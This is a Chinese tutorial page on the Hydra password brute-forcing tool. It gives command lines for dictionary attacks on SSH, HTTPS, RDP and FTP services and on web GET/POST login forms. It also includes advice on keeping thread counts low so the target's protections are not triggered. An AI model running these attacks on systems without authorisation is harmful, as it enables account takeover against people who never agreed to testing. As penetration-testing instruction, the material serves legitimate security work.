<h2 class="md-end-block md-heading"><span class="md-plain">一、工具概述</span></h2>
<p class="md-end-block md-p"><span class="md-plain">Hydra 是一款功能强大的暴力破解工具，支持多种网络协议与服务的账号密码破解（如 SSH、FTP、RDP、HTTP 等）。其核心优势在于多协议适配与高并发破解能力，破解成功率主要依赖于字典的完整性与针对性，常用于渗透测试中的社工型渗透场景。</span></p>

<h2 class="md-end-block md-heading"><span class="md-plain">二、基础语法</span></h2>


```
# hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]
```


<p class="md-end-block md-p"><span class="md-plain">语法涵盖核心参数组合方式，不同参数搭配可满足不同破解需求，需根据目标服务与场景灵活调整。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">支持的常见服务 / 协议</span></h3>
<p class="md-end-block md-p"><span class="md-plain">涵盖主流网络服务与协议，包括但不限于：telnet、ftp、pop3 [-ntlm]、imap [-ntlm]、smb、smbnt、http [s]-{head|get}、http-{get|post}-form、http-proxy、cisco、cisco-enable、vnc、mssql、mysql、oracle-listener、postgres、ssh2、rdp、smtp-auth [-ntlm]、teamspeak、sip。</span></p>

<h2 class="md-end-block md-heading"><span class="md-plain">四、典型使用案例</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">1. SSH 服务破解</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">场景 1：基础批量破解（结果输出到日志）</span></h4>


```
# hydra -L users.txt -P password.txt -vV -o ssh.log -e ns 192.168.1.104 ssh
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">说明：用</span><span class="md-pair-s" spellcheck="false"><code>users.txt</code></span><span class="md-plain">遍历用户名、</span><span class="md-pair-s" spellcheck="false"><code>password.txt</code></span><span class="md-plain">遍历密码，详情输出到</span><span class="md-pair-s" spellcheck="false"><code>ssh.log</code></span><span class="md-plain">，同时试探空密码与 “用户名 = 密码” 组合，破解成功后直接显示结果。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">场景 2：限制线程 + 找到即停止</span></h4>


```
# hydra -L users.txt -P password.txt -t 10 -vV -e ns -f ssh://192.168.1.104
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">说明：线程设为 10（降低目标防护触发概率），找到第一组有效账号后停止，也可加</span><span class="md-pair-s" spellcheck="false"><code>-o save.log</code></span><span class="md-plain">保存结果。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2. HTTPS 服务破解</span></h3>


```
# hydra -m /index.php -l admin -P pass.txt 192.168.1.104 https
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">说明：指定 HTTPS 登录页面</span><span class="md-pair-s" spellcheck="false"><code>/index.php</code></span><span class="md-plain">，用单个用户名</span><span class="md-pair-s" spellcheck="false"><code>admin</code></span><span class="md-plain">搭配</span><span class="md-pair-s" spellcheck="false"><code>pass.txt</code></span><span class="md-plain">字典破解。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3. RDP（远程桌面）破解</span></h3>


```
# hydra 192.168.10.198 rdp -l administrator -P password.txt -V -o rdp.log
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">说明：针对 RDP 服务破解</span><span class="md-pair-s" spellcheck="false"><code>administrator</code></span><span class="md-plain">账号，结果保存到</span><span class="md-pair-s" spellcheck="false"><code>rdp.log</code></span><span class="md-plain">，</span><span class="md-pair-s" spellcheck="false"><code>-V</code></span><span class="md-plain">显示完整破解过程。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">4. FTP 服务破解</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">基础语法（默认线程）</span></h4>


```
# hydra 192.168.1.104 ftp -l test -P pass.txt -t 16 -vV
```


<h4 class="md-end-block md-heading"><span class="md-plain">含特殊试探（空密码 + 用户名 = 密码）</span></h4>


```
# hydra 192.168.1.104 ftp -l test -P pass.txt -e ns -vV
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">说明：FTP 默认端口 21，无需额外指定；</span><span class="md-pair-s" spellcheck="false"><code>-e ns</code></span><span class="md-plain">开启特殊密码试探。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">5. Web 登录破解（GET/POST 方式）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">（1）GET 方式（简单表单）</span></h4>


```
# hydra -l admin -P pass.txt -t 5 -vV -e ns -f 192.168.1.104 http-get /admin/index.php
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">说明：破解</span><span class="md-pair-s" spellcheck="false"><code>/admin/index.php</code></span><span class="md-plain">的 GET 登录表单，线程 5（避免触发 Web 服务防护），找到有效账号即停止。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">（2）POST 方式（带参数表单）</span></h4>
<p class="md-end-block md-p"><span class="md-plain">假设目标登录表单代码如下：</span></p>



```
<form action="index.php" method="POST"> <input type="text" name="name" />

 <input type="password" name="pwd" />

 <input type="submit" name="sub" value="提交"> </form>
```


<p class="md-end-block md-p"><span class="md-plain">对应破解命令：</span></p>



```
# hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form "index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>"
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">解析：</span><span class="md-pair-s" spellcheck="false"><code>index.php</code></span><span class="md-plain">为表单提交页面；</span><span class="md-pair-s" spellcheck="false"><code>name=^USER^&amp;pwd=^PASS^</code></span><span class="md-plain">中，</span><span class="md-pair-s" spellcheck="false"><code>^USER^</code></span><span class="md-plain">/</span><span class="md-pair-s" spellcheck="false"><code>^PASS^</code></span><span class="md-plain">是 Hydra 内置变量，分别替换用户名 / 密码；</span><span class="md-pair-s" spellcheck="false"><code>&lt;title&gt;invalido&lt;/title&gt;</code></span><span class="md-plain">是错误登录的返回特征（需根据目标页面实际提示调整）；</span><span class="md-pair-s "><strong><span class="md-plain">该方式无法破解含验证码的登录表单</span></strong></span><span class="md-plain">。</span></p>
</li>
</ul>
